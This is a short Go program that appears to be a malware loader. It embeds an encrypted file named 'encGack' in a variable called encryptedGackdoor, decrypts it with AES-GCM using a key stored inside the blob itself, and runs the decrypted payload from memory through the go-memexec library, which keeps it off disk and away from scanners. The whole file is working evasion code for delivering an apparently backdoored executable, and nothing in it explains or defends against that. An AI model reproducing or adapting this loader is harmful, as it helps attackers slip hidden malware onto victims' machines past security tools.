package main

import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"os"
	"os/exec"

	"github.com/amenzhinsky/go-memexec"
)

func decryptFile(enc, key []byte) []byte {
	c, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(c)
	nonce := enc[:gcm.NonceSize()]
	ct := enc[gcm.NonceSize():]
	file, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		println(err.Error())
	}
	return file
}

//go:embed "encGack"
var encryptedGackdoor []byte

func main() {
	key := encryptedGackdoor[:32]
	ct := encryptedGackdoor[32:]
	payload := decryptFile(ct, key)
	exe, err := memexec.New(payload)
	if err != nil {
		os.Exit(0)
	}
	defer exe.Close()

	var cmd *exec.Cmd
	cmd = exe.Command()
	err = cmd.Run()
	if err != nil {
		println(err.Error())
	}
}
